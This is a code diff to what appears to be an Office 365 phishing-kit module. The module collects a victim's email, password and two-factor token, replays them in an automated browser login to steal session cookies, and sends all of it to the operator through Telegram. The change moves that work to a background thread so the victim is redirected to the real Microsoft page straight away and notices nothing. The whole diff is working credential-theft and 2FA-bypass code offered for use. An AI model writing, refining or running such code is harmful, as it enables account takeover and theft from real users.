@@ -65,15 +65,27 @@ class Office365Module(BaseModule):
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
 
-        # attempt automated login & cookie capture
-        cookies = self.perform_automated_login()
+        # Off-load the slow Selenium work so we answer the HTTP request immediately
+        import threading, json
 
-        cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
-        full_msg = (
-            f"*O365 Credential Capture (Full)*\nEmail: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n\nCookies:\n```json\n{cookie_block}\n```"
-        )
-        self.send_telegram(full_msg)
+        def _cookie_worker(user, pwd, token):
+            try:
+                self.user = user
+                self.captured_password = pwd
+                self.two_factor_token = token
+                cookies = self.perform_automated_login()
+            except Exception as ex:
+                cookies = [{"error": str(ex)}]
 
+            cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
+            msg = (
+                f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```json\n{cookie_block}\n```"
+            )
+            self.send_telegram(msg)
+
+        threading.Thread(target=_cookie_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()
+
+        # Give the victim the real Microsoft redirect right away
         return redirect(self.final_url, code=302)
 
     def send_telegram(self, message):
